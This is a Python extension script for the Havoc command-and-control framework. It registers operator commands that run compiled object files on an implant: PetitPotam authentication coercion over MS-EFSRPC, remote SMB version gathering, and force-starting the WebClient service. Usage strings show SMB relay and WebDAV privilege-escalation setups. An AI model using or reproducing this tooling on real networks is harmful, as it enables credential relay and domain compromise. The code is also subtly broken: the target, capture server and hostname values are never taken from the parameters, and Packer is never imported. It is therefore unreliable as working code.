from havoc import Demon, RegisterCommand
from struct import pack, calcsize


def petitpotam(demonID, *param):
    TaskID : str    = None
    demon  : Demon  = None

    packer          = Packer()
    demon           = Demon( demonID )
    num_params      = len(param)
    target          = ''
    capture_server  = ''


    if num_params != 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, 'Only accepts two parameters [Capture Server, Target]' )
        return False

    packer.addWstr(target)
    packer.addWstr(capture_server)

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon to coerce with PetitPotam - USING bin/PetitPotam.{demon.ProcessArch}.o")

    demon.InlineExecute( TaskID, "go", f"bin/PetitPotam.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID


def smbinfo(demonID, *param):
    TaskID : str    = None
    demon  : Demon  = None

    packer          = Packer()
    demon           = Demon( demonID )
    num_params      = len(param)
    hostname  = ''


    if num_params != 1:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, 'Usage: smbinfo [Hostname]' )
        return False

    packer.addWstr( hostname )

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon to get remote system version info")

    demon.InlineExecute( TaskID, "go", f"bin/Smbinfo.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID


def startwebclient(demonID, *param):
    TaskID : str    = None
    demon  : Demon  = None
    demon           = Demon( demonID )

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon to force start the Web Client service")

    demon.InlineExecute( TaskID, "go", f"bin/StartWebClient.{demon.ProcessArch}.o", b'', False )

    return TaskID


RegisterCommand(petitpotam, "", "petitpotam", "Coerce Windows hosts to authenticate to other machines via MS-EFSRPC", 0, "[Capture Server] [Target]", """
                    SMB Relay Attack                : petitpotam KALI DC2019
                    WebDAV LPE Attack               : petitpotam KALI@80/nop localhost
                    WebDAV LPE w/SOCKS and rportfwd : petitpotam localhost@80/nop localhost
                """)

RegisterCommand(smbinfo, "", "smbinfo", "Gather remote system version info using the NetWkstaGetInfo API.", 0, "[Hostname]", "CASTELBLACK")
RegisterCommand(startwebclient, "", "startwebclient", "Force start the Web Client service.", 0, "", "")

